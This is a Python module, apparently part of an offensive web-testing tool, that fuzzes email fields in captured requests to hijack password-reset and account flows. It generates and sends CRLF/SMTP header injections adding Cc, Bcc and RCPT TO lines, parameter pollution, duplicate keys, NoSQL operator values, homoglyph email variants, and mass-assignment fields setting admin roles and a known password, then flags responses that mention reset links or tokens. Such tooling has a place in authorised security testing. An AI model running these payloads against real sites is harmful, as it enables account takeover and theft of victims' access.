#!/usr/bin/env python3

import sys
sys.dont_write_bytecode = True

from utils.style import Colors
from utils.utils import (
    requests,
    parse_headers,
    urllib3,
    re,
    traceback,
    get_domain_from_url,
    json,
    EMAIL_REGEX,
    human_time
)
import urllib.parse
import uuid


def inject_into_email_param(body, payload):
    # JSON
    try:
        data = json.loads(body)

        def replace_json(obj):
            if isinstance(obj, dict):
                return {k: replace_json(v) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [replace_json(i) for i in obj]
            elif isinstance(obj, str):
                if re.search(EMAIL_REGEX, obj, re.IGNORECASE):
                    return obj + payload
            return obj

        new_data = replace_json(data)
        return json.dumps(new_data)

    except:
        pass

    # x-www-form-urlencoded
    try:
        parsed = urllib.parse.parse_qs(body, keep_blank_values=True)

        modified = False

        for key in parsed:
            for i, val in enumerate(parsed[key]):
                if re.search(EMAIL_REGEX, val, re.IGNORECASE):
                    parsed[key][i] = val + payload
                    modified = True

        if modified:
            return urllib.parse.urlencode(parsed, doseq=True)

    except:
        pass

    # multipart/form-data (simple)
    if "Content-Disposition" in body:
        def multipart_replace(match):
            value = match.group(1)
            if re.search(EMAIL_REGEX, value, re.IGNORECASE):
                return value + payload
            return value

        return re.sub(r"\r?\n\r?\n([^\r\n]+)",
                      lambda m: "\n\n" + multipart_replace(m),
                      body)

    # raw text fallback
    pattern = rf"([^\s&=,:]+?\s*[:=]\s*)({EMAIL_REGEX})"

    def replacer(match):
        return f"{match.group(1)}{match.group(2)}{payload}"

    return re.sub(pattern, replacer, body, flags=re.IGNORECASE)


def get_email_param_names(body):

    if not body:
        return []

    if isinstance(body, bytes):
        body = body.decode(errors="ignore")

    param_names = set()

    # -------------------------
    # JSON
    # -------------------------
    data = None

    if isinstance(body, dict):
        data = body
    else:
        try:
            data = json.loads(body.strip())
        except:
            pass

    if data is not None:
        def extract_json(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if isinstance(v, str) and re.search(EMAIL_REGEX, v, re.IGNORECASE):
                        param_names.add(k)
                    else:
                        extract_json(v)

            elif isinstance(obj, list):
                for i in obj:
                    extract_json(i)

        extract_json(data)

    # -------------------------
    # form-urlencoded
    # -------------------------
    try:
        parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
        for key, values in parsed.items():
            for val in values:
                if re.search(EMAIL_REGEX, val, re.IGNORECASE):
                    param_names.add(key)
    except:
        pass

    # -------------------------
    # multipart
    # -------------------------
    parts = re.split(r"-{2,}.*", body)

    for part in parts:
        name_match = re.search(r'name="([^"]+)"', part)
        value_match = re.search(r"\r?\n\r?\n(.+)", part, re.DOTALL)

        if name_match and value_match:
            name = name_match.group(1)
            value = value_match.group(1).strip()

            if re.search(EMAIL_REGEX, value, re.IGNORECASE):
                param_names.add(name)

    # -------------------------
    # raw fallback
    # -------------------------
    matches = re.findall(
        rf'"?([^"\s:]+)"?\s*[:=]\s*"?({EMAIL_REGEX})"?',
        body,
        re.IGNORECASE
    )

    for key, _ in matches:
        param_names.add(key)

    return list(param_names)


def _extract_email_from_body(body):
    """Extract the first email found in the body."""
    match = re.search(EMAIL_REGEX, body, re.IGNORECASE)
    return match.group(0) if match else None


def _detect_content_type(headers):
    """Detect current content type from headers."""
    for k, v in headers.items():
        if k.lower() == "content-type":
            v_lower = v.lower()
            if "application/json" in v_lower:
                return "json"
            if "application/x-www-form-urlencoded" in v_lower:
                return "form"
            if "multipart/form-data" in v_lower:
                return "multipart"
    return "unknown"


def _parse_body_params(body, content_type):
    """
    Extract key-value pairs from body regardless of format.
    Returns list of (key, value) tuples.
    """
    params = []

    if content_type == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, v))
        except:
            pass

    elif content_type == "form":
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            for k, vals in parsed.items():
                for v in vals:
                    params.append((k, v))
        except:
            pass

    elif content_type == "multipart":
        parts = re.findall(
            r'name="([^"]+)".*?\r?\n\r?\n([^\r\n-]+)',
            body, re.DOTALL
        )
        for k, v in parts:
            params.append((k, v.strip()))

    # Fallback: try both
    if not params:
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, v))
        except:
            try:
                parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                for k, vals in parsed.items():
                    for v in vals:
                        params.append((k, v))
            except:
                pass

    return params


def _build_json_body(params):
    """Build JSON body from params."""
    data = {}
    for k, v in params:
        data[k] = v
    return json.dumps(data)


def _build_form_body(params):
    """Build form-urlencoded body from params."""
    return urllib.parse.urlencode(params)


def _build_multipart_body(params):
    """Build multipart/form-data body from params. Returns (body, content_type)."""
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
    parts = []
    for k, v in params:
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{k}"\r\n'
            f"\r\n"
            f"{v}\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts)
    ct = f"multipart/form-data; boundary={boundary}"
    return body, ct


def _set_content_type(headers, content_type_value):
    """Return a copy of headers with Content-Type replaced."""
    new_headers = {}
    found = False
    for k, v in headers.items():
        if k.lower() == "content-type":
            new_headers[k] = content_type_value
            found = True
        else:
            new_headers[k] = v
    if not found:
        new_headers["Content-Type"] = content_type_value
    return new_headers


def body_transformation(url, human, parsed_req, baseline, interact, email, proxy=None):
    """
    Content-Type transformation + parameter format mutation.
    """
    print(f"{Colors.BLUE} └── Body transformation{Colors.RESET}")

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    if not body:
        print(f"  {Colors.YELLOW}[!] No body to transform{Colors.RESET}")
        return

    current_ct = _detect_content_type(headers)
    params = _parse_body_params(body, current_ct)
    victim_email = _extract_email_from_body(body)

    if not params or not victim_email:
        print(f"  {Colors.YELLOW}[!] Could not extract params or email from body{Colors.RESET}")
        return

    gepn = get_email_param_names(body)
    param_mail = gepn[0] if gepn else None
    if not param_mail:
        print(f"  {Colors.YELLOW}[!] Could not identify email parameter name{Colors.RESET}")
        return

    payloads = []

    # ─── 1. Content-Type switching ───────────────────────────────────────────
    ct_conversions = []

    if current_ct != "json":
        json_body = _build_json_body(params)
        json_headers = _set_content_type(headers, "application/json")
        ct_conversions.append((json_body, json_headers, f"CT-switch → JSON"))

    if current_ct != "form":
        str_params = [(k, str(v)) for k, v in params]
        form_body = _build_form_body(str_params)
        form_headers = _set_content_type(headers, "application/x-www-form-urlencoded")
        ct_conversions.append((form_body, form_headers, f"CT-switch → form-urlencoded"))

    if current_ct != "multipart":
        str_params = [(k, str(v)) for k, v in params]
        mp_body, mp_ct = _build_multipart_body(str_params)
        mp_headers = _set_content_type(headers, mp_ct)
        ct_conversions.append((mp_body, mp_headers, f"CT-switch → multipart"))

    if current_ct == "json":
        ct_conversions.append((body, _set_content_type(headers, "application/x-www-form-urlencoded"), "CT-mismatch → JSON body with form CT"))
        ct_conversions.append((body, _set_content_type(headers, "text/plain"), "CT-mismatch → JSON body with text/plain CT"))
    elif current_ct == "form":
        ct_conversions.append((body, _set_content_type(headers, "application/json"), "CT-mismatch → form body with JSON CT"))
        ct_conversions.append((body, _set_content_type(headers, "text/plain"), "CT-mismatch → form body with text/plain CT"))

    no_ct_headers = {k: v for k, v in headers.items() if k.lower() != "content-type"}
    ct_conversions.append((body, no_ct_headers, "CT-removed → no Content-Type header"))

    for ct_body, ct_headers, desc in ct_conversions:
        payloads.append((ct_body, ct_headers, desc))

    # ─── 2. Array notation ───────────────────────────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict) and param_mail in data:
                data_arr = data.copy()
                data_arr[param_mail] = [victim_email, email]
                payloads.append((json.dumps(data_arr), headers, f"JSON array → [\"{victim_email}\",\"{email}\"]"))

                data_arr_rev = data.copy()
                data_arr_rev[param_mail] = [email, victim_email]
                payloads.append((json.dumps(data_arr_rev), headers, f"JSON array reversed → [\"{email}\",\"{victim_email}\"]"))

                data_arr_single = data.copy()
                data_arr_single[param_mail] = [email]
                payloads.append((json.dumps(data_arr_single), headers, f"JSON array single → [\"{email}\"]"))
        except:
            pass

    elif current_ct == "form":
        arr_body = f"{param_mail}[]={urllib.parse.quote(victim_email)}&{param_mail}[]={urllib.parse.quote(email)}"
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            other_params = []
            for k, vals in parsed.items():
                if k != param_mail:
                    for v in vals:
                        other_params.append(f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}")
            if other_params:
                arr_body = "&".join(other_params) + "&" + arr_body
        except:
            pass
        payloads.append((arr_body, headers, f"form array → {param_mail}[]={victim_email}&{param_mail}[]={email}"))

        arr_body_rev = f"{param_mail}[]={urllib.parse.quote(email)}&{param_mail}[]={urllib.parse.quote(victim_email)}"
        if other_params:
            arr_body_rev = "&".join(other_params) + "&" + arr_body_rev
        payloads.append((arr_body_rev, headers, f"form array reversed → {param_mail}[]={email}&{param_mail}[]={victim_email}"))

    # ─── 3. Type juggling (JSON only) ────────────────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict) and param_mail in data:
                juggle_values = [
                    (True, "bool-true"),
                    (False, "bool-false"),
                    (None, "null"),
                    (0, "int-zero"),
                    (1, "int-one"),
                    ("", "empty-string"),
                    ({param_mail: email}, "nested-object"),
                    ({"$ne": ""}, "nosql-ne"),
                    ({"$gt": ""}, "nosql-gt"),
                    ({"$regex": ".*"}, "nosql-regex"),
                ]
                for val, desc in juggle_values:
                    data_j = data.copy()
                    data_j[param_mail] = val
                    payloads.append((json.dumps(data_j), headers, f"type-juggle → {param_mail}={desc}"))
        except:
            pass

    # ─── 4. Parameter wrapping / mass assignment ─────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                wrappers = ["user", "account", "member", "profile", "data", "params", "attributes"]
                for w in wrappers:
                    merged = data.copy()
                    merged[w] = {param_mail: email}
                    payloads.append((json.dumps(merged), headers, f"mass-assign → {w}.{param_mail}={email}"))

                extra_fields = [
                    ("password", "Pwned123!", "inject-password"),
                    ("new_password", "Pwned123!", "inject-new_password"),
                    ("role", "admin", "inject-role"),
                    ("admin", True, "inject-admin"),
                    ("is_admin", True, "inject-is_admin"),
                    ("verified", True, "inject-verified"),
                    ("email_verified", True, "inject-email_verified"),
                    ("user_id", 1, "inject-user_id"),
                    ("id", 1, "inject-id"),
                ]
                for field, val, desc in extra_fields:
                    if field not in data:
                        data_extra = data.copy()
                        data_extra[field] = val
                        payloads.append((json.dumps(data_extra), headers, f"mass-assign → {desc}"))
        except:
            pass

    # ─── 5. Duplicate keys in JSON ───────────────────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict) and param_mail in data:
                parts = []
                for k, v in data.items():
                    parts.append(f'"{k}":{json.dumps(v)}')
                parts.append(f'"{param_mail}":{json.dumps(email)}')
                dupe_body = "{" + ",".join(parts) + "}"
                payloads.append((dupe_body, headers, f"dupe-key → {param_mail}={victim_email} then {param_mail}={email}"))

                parts2 = [f'"{param_mail}":{json.dumps(email)}']
                for k, v in data.items():
                    parts2.append(f'"{k}":{json.dumps(v)}')
                dupe_body2 = "{" + ",".join(parts2) + "}"
                payloads.append((dupe_body2, headers, f"dupe-key → {param_mail}={email} then {param_mail}={victim_email}"))
        except:
            pass

    # ─── 6. Email variations / routing tricks ──────────────────────────────────
    email_parts = email.split("@") if "@" in email else None
    victim_parts = victim_email.split("@") if "@" in victim_email else None

    if email_parts and victim_parts:
        attacker_domain = email_parts[1]
        attacker_local = email_parts[0]
        v_local = victim_parts[0]
        v_domain = victim_parts[1]

        email_variations = [
            # Case / whitespace / encoding
            victim_email.upper(),
            victim_email[0].upper() + victim_email[1:],
            f" {victim_email}",
            f"{victim_email} ",
            f"{victim_email}\t",
            f"{victim_email}%00",
            f"{victim_email}\x00",
            f"{v_local}+anything@{v_domain}",
            f"{v_local[0]}.{v_local[1:]}@{v_domain}",
            victim_email.replace("a", "\u0430", 1),

            # Quoted local part / RFC comments
            f'"{victim_email}"@{attacker_domain}',
            f'"{v_local}"@{v_domain}@{attacker_domain}',
            f"{v_local}@{v_domain}({attacker_domain})",
            f"({attacker_domain}){v_local}@{v_domain}",

            # Multiple @
            f"{v_local}@{attacker_domain}@{v_domain}",
            f"{v_local}@{v_domain}@{attacker_domain}",

            # Percent hack
            f"{v_local}%{v_domain}@{attacker_domain}",
            f"{v_local}%{attacker_domain}@{v_domain}",

            # Null byte / CRLF + attacker domain
            f"{victim_email}%00@{attacker_domain}",
            f"{victim_email}%0d%0a@{attacker_domain}",

            # DB truncation
            f"{v_local}{'a' * max(0, 252 - len(victim_email))}@{attacker_domain}",
            f"{v_local}{'a' * max(0, 61 - len(v_local))}@{attacker_domain}",

            # Double encoding / fullwidth @
            f"{v_local}%2540{v_domain}",
            f"{v_local}%40{v_domain}",
            victim_email.replace("@", "\uFE6B"),
            victim_email.replace("@", "\uFF20"),

            # Space as multi-recipient separator
            f"{victim_email} {email}",
            f"{email} {victim_email}",

            # SMTP RCPT TO injection
            f"{victim_email}%0d%0aRCPT TO:<{email}>",
            f"{victim_email}\r\nRCPT TO:<{email}>",
        ]

        # IDN homoglyph domain (conditional)
        for char_l, char_c in [("a", "\u0430"), ("e", "\u0435"), ("o", "\u043E")]:
            if char_l in v_domain:
                email_variations.append(f"{v_local}@{v_domain.replace(char_l, char_c, 1)}")

        # Unicode dots in domain (conditional)
        if "." in v_domain:
            parts = v_domain.split(".")
            email_variations.append(f"{v_local}@{chr(0x3002).join(parts)}")
            email_variations.append(f"{v_local}@{chr(0xFF0E).join(parts)}")

        # Gmail specific (conditional)
        if "gmail" in v_domain.lower():
            email_variations.append(".".join(v_local) + f"@{v_domain}")
            email_variations.append(f"{v_local}@googlemail.com")
        elif "googlemail" in v_domain.lower():
            email_variations.append(f"{v_local}@gmail.com")

        for varied_email in email_variations:
            if current_ct == "json":
                try:
                    data = json.loads(body)
                    data[param_mail] = varied_email
                    payloads.append((json.dumps(data), headers, varied_email))
                except:
                    pass
            elif current_ct == "form":
                try:
                    parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                    parsed[param_mail] = [varied_email]
                    var_body = urllib.parse.urlencode(parsed, doseq=True)
                    payloads.append((var_body, headers, varied_email))
                except:
                    pass

    # ─── 6b. Alternative email param names (extra params) ────────────────────
    if email_parts:
        alt_params = ["Email", "mail", "username", "login", "emailAddress",
                      "e-mail", "user_email", "to", "recipient"]
        for alt_name in alt_params:
            if alt_name.lower() == param_mail.lower():
                continue
            if current_ct == "json":
                try:
                    data = json.loads(body)
                    data[alt_name] = email
                    payloads.append((json.dumps(data), headers, f"{alt_name}={email}"))
                except:
                    pass
            elif current_ct == "form":
                alt_body = f"{body}&{urllib.parse.quote(alt_name)}={urllib.parse.quote(email)}"
                payloads.append((alt_body, headers, f"{alt_name}={email}"))

    # ─── 7. Bracket key in JSON ──────────────────────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict) and param_mail in data:
                bracket_key = f"{param_mail}[]"

                d = data.copy()
                del d[param_mail]
                d[bracket_key] = email
                payloads.append((json.dumps(d), headers, f"bracket-key → {bracket_key}={email}"))

                d2 = data.copy()
                del d2[param_mail]
                d2[bracket_key] = [victim_email, email]
                payloads.append((json.dumps(d2), headers, f"bracket-key array → {bracket_key}=[victim,attacker]"))

                d2r = data.copy()
                del d2r[param_mail]
                d2r[bracket_key] = [email, victim_email]
                payloads.append((json.dumps(d2r), headers, f"bracket-key array reversed → {bracket_key}=[attacker,victim]"))

                d3 = data.copy()
                d3[bracket_key] = email
                payloads.append((json.dumps(d3), headers, f"both email + email[] → {bracket_key}={email}"))

                d4 = data.copy()
                del d4[param_mail]
                d4[bracket_key] = victim_email
                d4[param_mail] = email
                payloads.append((json.dumps(d4), headers, f"both email[] + email → {param_mail}={email}"))
        except:
            pass

    # ─── 8. Form duplicate params WITHOUT brackets ───────────────────────────
    if current_ct == "form":
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            other_params = []
            for k, vals in parsed.items():
                if k != param_mail:
                    for v in vals:
                        other_params.append(f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}")

            dup_body = "&".join(other_params + [
                f"{param_mail}={urllib.parse.quote(victim_email)}",
                f"{param_mail}={urllib.parse.quote(email)}",
            ])
            payloads.append((dup_body, headers, f"form-dup → {param_mail}={victim_email}&{param_mail}={email}"))

            dup_body_rev = "&".join(other_params + [
                f"{param_mail}={urllib.parse.quote(email)}",
                f"{param_mail}={urllib.parse.quote(victim_email)}",
            ])
            payloads.append((dup_body_rev, headers, f"form-dup reversed → {param_mail}={email}&{param_mail}={victim_email}"))

            dup_body_single = "&".join(other_params + [
                f"{param_mail}={urllib.parse.quote(email)}",
            ])
            payloads.append((dup_body_single, headers, f"form-dup single attacker → {param_mail}={email}"))

        except:
            pass

    # ─── 9. Composite string values ──────────────────────────────────────────
    composite_separators = [
        (",", "comma"), (";", "semicolon"), (" ", "space"),
        ("|", "pipe"), ("\n", "newline"), ("%20", "url-space"), ("%2C", "url-comma"),
    ]
    for sep, sep_name in composite_separators:
        composed = f"{victim_email}{sep}{email}"
        composed_rev = f"{email}{sep}{victim_email}"
        if current_ct == "json":
            try:
                data = json.loads(body)
                if isinstance(data, dict) and param_mail in data:
                    d = data.copy()
                    d[param_mail] = composed
                    payloads.append((json.dumps(d), headers, f"composite-{sep_name} → victim{sep}attacker"))
                    d_rev = data.copy()
                    d_rev[param_mail] = composed_rev
                    payloads.append((json.dumps(d_rev), headers, f"composite-{sep_name} → attacker{sep}victim"))
            except:
                pass
        elif current_ct == "form":
            try:
                parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                parsed[param_mail] = [composed]
                payloads.append((urllib.parse.urlencode(parsed, doseq=True), headers, f"composite-{sep_name} → victim{sep}attacker"))
                parsed[param_mail] = [composed_rev]
                payloads.append((urllib.parse.urlencode(parsed, doseq=True), headers, f"composite-{sep_name} → attacker{sep}victim"))
            except:
                pass

    # ─── Send standard payloads ──────────────────────────────────────────────
    for p_body, p_headers, desc in payloads:
        body_display = p_body
        payload_tag = f"{body_display}"

        try:
            human_time(human)
            resp = requests.request(
                method=method, url=uri, headers=p_headers,
                data=p_body, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )

            if resp.status_code != baseline['status'] and resp.status_code not in [400, 403]:
                print(f"{Colors.YELLOW}   └── [STATUS {resp.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")

            if abs(len(resp.text) - baseline['body_length']) > 50:
                print(f"{Colors.YELLOW}   └── [LENGTH {len(resp.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")

            if email in resp.text:
                print(f"{Colors.GREEN}   └── [+] {email} reflected in body | {payload_tag}{Colors.RESET}")
            if email in str(resp.headers):
                print(f"{Colors.GREEN}   └── [+] {email} reflected in headers | {payload_tag}{Colors.RESET}")

            resp_lower = resp.text.lower()
            success_indicators = ["success", "email sent", "password reset", "reset link", "check your email", "token"]
            for indicator in success_indicators:
                if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
                    print(f"{Colors.GREEN}   └── [+] success indicator '{indicator}' in response | {payload_tag}{Colors.RESET}")
                    break

        except requests.RequestException as e:
            print(f"  {Colors.RED}[!] request error ({desc}): {e}{Colors.RESET}")

    # ─── 10. HTTP Parameter Pollution URL <-> Body ───────────────────────────
    hpp_cases = []

    qs_attacker = f"{param_mail}={urllib.parse.quote(email)}"
    uri_qs_attacker = uri + ("&" if "?" in uri else "?") + qs_attacker
    hpp_cases.append((body, headers, uri_qs_attacker, "HPP → attacker in QS, victim in body"))

    qs_victim = f"{param_mail}={urllib.parse.quote(victim_email)}"
    uri_qs_victim = uri + ("&" if "?" in uri else "?") + qs_victim

    try:
        if current_ct == "json":
            data = json.loads(body)
            data_att = data.copy()
            data_att[param_mail] = email
            hpp_body_b = json.dumps(data_att)
        elif current_ct == "form":
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            parsed[param_mail] = [email]
            hpp_body_b = urllib.parse.urlencode(parsed, doseq=True)
        else:
            hpp_body_b = body
        hpp_cases.append((hpp_body_b, headers, uri_qs_victim, "HPP → victim in QS, attacker in body"))
    except:
        pass

    try:
        if current_ct == "json":
            data = json.loads(body)
            data_att2 = data.copy()
            data_att2[param_mail] = email
            hpp_body_c = json.dumps(data_att2)
        elif current_ct == "form":
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            parsed[param_mail] = [email]
            hpp_body_c = urllib.parse.urlencode(parsed, doseq=True)
        else:
            hpp_body_c = body
        hpp_cases.append((hpp_body_c, headers, uri_qs_attacker, "HPP → attacker in QS + attacker in body"))
    except:
        pass

    for p_body, p_headers, p_uri, desc in hpp_cases:
        body_display = p_body
        payload_tag = f"URI={p_uri} | {body_display}"
        try:
            human_time(human)
            resp = requests.request(
                method=method, url=p_uri, headers=p_headers,
                data=p_body, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )

            if resp.status_code != baseline['status'] and resp.status_code not in [400, 403]:
                print(f"{Colors.YELLOW}   └── [STATUS {resp.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
            if abs(len(resp.text) - baseline['body_length']) > 50:
                print(f"{Colors.YELLOW}   └── [LENGTH {len(resp.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")
            if email in resp.text:
                print(f"{Colors.GREEN}   └── [+] {email} reflected in body {Colors.RESET}| PAYLOAD: {payload_tag}")
            if email in str(resp.headers):
                print(f"{Colors.GREEN}   └── [+] {email} reflected in headers {Colors.RESET}| PAYLOAD: {payload_tag}")

            resp_lower = resp.text.lower()
            for indicator in ["success", "email sent", "password reset", "reset link", "check your email", "token"]:
                if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
                    print(f"{Colors.GREEN}   └── [+] success indicator '{indicator}' in response {Colors.RESET}| PAYLOAD: {payload_tag}")
                    break

        except requests.RequestException as e:
            print(f"  {Colors.RED}[!] HPP request error ({desc}): {e}{Colors.RESET}")


def data_pollution(url, human, parsed_req, baseline, interact, email, proxy=None):
    """SMTP injection, separator injection, encoding tricks appended to victim email."""
    print(f"{Colors.BLUE} └── Data pollution{Colors.RESET}")

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    gepn = get_email_param_names(body)
    if len(gepn) == 1:
        param_mail = gepn[0]
        email_payloads = [
            f"&{param_mail}={email}",
            f"%20{param_mail}={email}",
            f"|{param_mail}={email}",
            f",{param_mail}={email}",
            f";{param_mail}={email}",
            f"+{param_mail}={email}",
            f"&{email}",
            f"%20{email}",
            f"|{email}",
            f",{email}",
            f";{email}",
            f"+{email}",
            f"@{email}",
            f"%0ACc:{email}",
            f"%0ABcc:{email}",
            f"%0D%0ACc:{email}",
            f"%0A%0Dcc:{email}",
            f"%0A%0Dbcc:{email}",
            f"%20%0d%0aTo:{email}",
            f"%0d%0aCC:{email}",
            f"%0d%0aBCC:{email}",
            f"%0d%0aTo:{email}",
            f"\r\nCC:{email}",
            f"\r\nTo:{email}",
            f"%E5%98%8A%E9%8A%8DCC:{email}",
            f"%0a%20CC:{email}",
            f"<{email}>",
            f"\"{email}\"",
            f"'{email}'",
            f"\\n{email}",
            f"\\r{email}",
            f"{{{email}}}",
            f"%00{email}",
            f"\x00{email}",
            f"%40{email}",
            f"%2540{email}",
            f"%2C{email}",
            f"%3B{email}",
        ]
        if re.search(EMAIL_REGEX, body, re.IGNORECASE):
            for ep in email_payloads:
                human_time(human)
                body_injected = inject_into_email_param(body, ep)
                body_display = body_injected
                payload_tag = f"PAYLOAD: {ep} | BODY: {body_display}"
                try:
                    resp_bi = requests.request(
                        method=method, url=uri, headers=headers,
                        data=body_injected, verify=False, allow_redirects=False,
                        timeout=10, proxies=proxies,
                    )
                    if resp_bi.status_code != baseline['status'] and resp_bi.status_code not in [400, 403]:
                        print(f"{Colors.YELLOW}   └── [STATUS {resp_bi.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
                    if abs(len(resp_bi.text) - baseline['body_length']) > 50:
                        print(f"{Colors.YELLOW}   └── [LENGTH {len(resp_bi.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")

                except requests.RequestException as e:
                    print(f"  {Colors.RED}[!] request error: {e}{Colors.RESET}")


def parameters_pollution(url, human, parsed_req, baseline, interact, email, proxy=None):
    print(f"{Colors.CYAN} ├ Parameters pollution analysis{Colors.RESET}")
    data_pollution(url, human, parsed_req, baseline, interact, email, proxy)
    body_transformation(url, human, parsed_req, baseline, interact, email, proxy)